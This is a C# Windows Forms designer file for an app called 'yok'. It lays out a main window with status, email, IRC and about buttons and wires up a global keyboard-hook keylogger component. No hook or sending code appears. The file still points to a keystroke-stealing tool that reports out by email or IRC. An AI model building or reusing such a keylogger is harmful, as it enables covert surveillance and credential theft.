using ThirdLib.KeyLogger;

namespace yok.App.Forms
{
    partial class MainForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
            this.timer = new System.Windows.Forms.Timer(this.components);
            this.toolStrip1 = new System.Windows.Forms.ToolStrip();
            this.buttonStatus = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.buttonMainConfig = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.buttonEmailConfig = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.buttonIrcConfig = new System.Windows.Forms.ToolStripButton();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.buttonAbout = new System.Windows.Forms.ToolStripButton();
            this.panelStatus = new System.Windows.Forms.Panel();
            this.keylogger = new Keylogger();
            this.buttonFolder = new System.Windows.Forms.Button();
            this.toolStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // timer
            // 
            this.timer.Interval = 5000;
            this.timer.Tick += new System.EventHandler(this.TimerTick);
            // 
            // toolStrip1
            // 
            this.toolStrip1.AutoSize = false;
            this.toolStrip1.BackColor = System.Drawing.Color.AliceBlue;
            this.toolStrip1.Dock = System.Windows.Forms.DockStyle.Left;
            this.toolStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.buttonStatus,
            this.toolStripSeparator1,
            this.buttonMainConfig,
            this.toolStripSeparator2,
            this.buttonEmailConfig,
            this.toolStripSeparator4,
            this.buttonIrcConfig,
            this.toolStripSeparator3,
            this.buttonAbout});
            this.toolStrip1.Location = new System.Drawing.Point(0, 0);
            this.toolStrip1.Name = "toolStrip1";
            this.toolStrip1.Size = new System.Drawing.Size(149, 498);
            this.toolStrip1.Stretch = true;
            this.toolStrip1.TabIndex = 3;
            this.toolStrip1.Text = "toolStrip1";
            // 
            // buttonStatus
            // 
            this.buttonStatus.Font = new System.Drawing.Font("Courier New", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonStatus.Image = yok.Resources.Resource.status.ToBitmap();
            this.buttonStatus.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.buttonStatus.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.buttonStatus.Name = "buttonStatus";
            this.buttonStatus.Size = new System.Drawing.Size(147, 51);
            this.buttonStatus.Text = "Status";
            this.buttonStatus.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.buttonStatus.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText;
            this.buttonStatus.Click += new System.EventHandler(this.ButtonStatusClick);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.ForeColor = System.Drawing.SystemColors.ControlText;
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(147, 6);
            // 
            // buttonMainConfig
            // 
            this.buttonMainConfig.Font = new System.Drawing.Font("Courier New", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonMainConfig.Image = ((System.Drawing.Image)(resources.GetObject("buttonMainConfig.Image")));
            this.buttonMainConfig.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.buttonMainConfig.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.buttonMainConfig.Name = "buttonMainConfig";
            this.buttonMainConfig.Size = new System.Drawing.Size(147, 51);
            this.buttonMainConfig.Text = "Main Config";
            this.buttonMainConfig.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
            this.buttonMainConfig.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText;
            this.buttonMainConfig.Click += new System.EventHandler(this.ButtonMainConfigClick);
            // 
            // toolStripSeparator2
            // 
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new System.Drawing.Size(147, 6);
            // 
            // buttonEmailConfig
            // 
            this.buttonEmailConfig.Font = new System.Drawing.Font("Courier New", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonEmailConfig.Image = ((System.Drawing.Image)(resources.GetObject("buttonEmailConfig.Image")));
            this.buttonEmailConfig.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.buttonEmailConfig.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.buttonEmailConfig.Name = "buttonEmailConfig";
            this.buttonEmailConfig.Size = new System.Drawing.Size(147, 51);
            this.buttonEmailConfig.Text = "EmailEngine Config";
            this.buttonEmailConfig.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText;
            this.buttonEmailConfig.Click += new System.EventHandler(this.ButtonEmailConfigClick);
            // 
            // toolStripSeparator4
            // 
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new System.Drawing.Size(147, 6);
            // 
            // buttonIrcConfig
            // 
            this.buttonIrcConfig.Font = new System.Drawing.Font("Courier New", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonIrcConfig.Image = ((System.Drawing.Image)(resources.GetObject("buttonIrcConfig.Image")));
            this.buttonIrcConfig.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.buttonIrcConfig.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.buttonIrcConfig.Name = "buttonIrcConfig";
            this.buttonIrcConfig.Size = new System.Drawing.Size(147, 51);
            this.buttonIrcConfig.Text = "IrcEngine Config";
            this.buttonIrcConfig.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText;
            this.buttonIrcConfig.Click += new System.EventHandler(this.ButtonIrcConfigClick);
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(147, 6);
            // 
            // buttonAbout
            // 
            this.buttonAbout.Font = new System.Drawing.Font("Courier New", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonAbout.Image = ((System.Drawing.Image)(resources.GetObject("buttonAbout.Image")));
            this.buttonAbout.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.buttonAbout.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.buttonAbout.Name = "buttonAbout";
            this.buttonAbout.Size = new System.Drawing.Size(147, 51);
            this.buttonAbout.Text = "About";
            this.buttonAbout.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText;
            this.buttonAbout.Click += new System.EventHandler(this.ButtonAboutClick);
            // 
            // panelStatus
            // 
            this.panelStatus.Location = new System.Drawing.Point(150, 0);
            this.panelStatus.Name = "panelStatus";
            this.panelStatus.Size = new System.Drawing.Size(428, 498);
            this.panelStatus.TabIndex = 4;
            // 
            // keylogger
            // 
            this.keylogger.Enabled = false;
            this.keylogger.Keylogger_Mode = Keylogger.Keylogger_Modes.Hooks;
            this.keylogger.ShowKEY_DOWN = true;
            this.keylogger.ShowKEY_UP = true;
            this.keylogger.VKCodeAsString += new Keylogger.ValueChangedEventHandler(this.KeyloggerVkCodeAsString);
            this.keylogger.VKCode += new Keylogger.ValueChangedEventHandler2(this.KeyloggerVkCode);
            // 
            // buttonFolder
            // 
            this.buttonFolder.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonFolder.Location = new System.Drawing.Point(12, 461);
            this.buttonFolder.Name = "buttonFolder";
            this.buttonFolder.Size = new System.Drawing.Size(21, 25);
            this.buttonFolder.TabIndex = 5;
            this.buttonFolder.Text = "o";
            this.buttonFolder.TextAlign = System.Drawing.ContentAlignment.TopLeft;
            this.buttonFolder.UseVisualStyleBackColor = true;
            this.buttonFolder.Click += new System.EventHandler(this.ButtonFolderClick);
            // 
            // MainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(580, 498);
            this.Controls.Add(this.buttonFolder);
            this.Controls.Add(this.panelStatus);
            this.Controls.Add(this.toolStrip1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "MainForm";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "yok";
            this.Load += new System.EventHandler(this.MainFormLoad);
            this.toolStrip1.ResumeLayout(false);
            this.toolStrip1.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer timer;
        private Keylogger keylogger;
        private System.Windows.Forms.ToolStrip toolStrip1;
        private System.Windows.Forms.ToolStripButton buttonStatus;
        private System.Windows.Forms.ToolStripButton buttonMainConfig;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator2;
        private System.Windows.Forms.ToolStripButton buttonIrcConfig;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator3;
        private System.Windows.Forms.ToolStripButton buttonAbout;
        private System.Windows.Forms.ToolStripButton buttonEmailConfig;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator4;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator1;
        private System.Windows.Forms.Panel panelStatus;
        private System.Windows.Forms.Button buttonFolder;
    }
}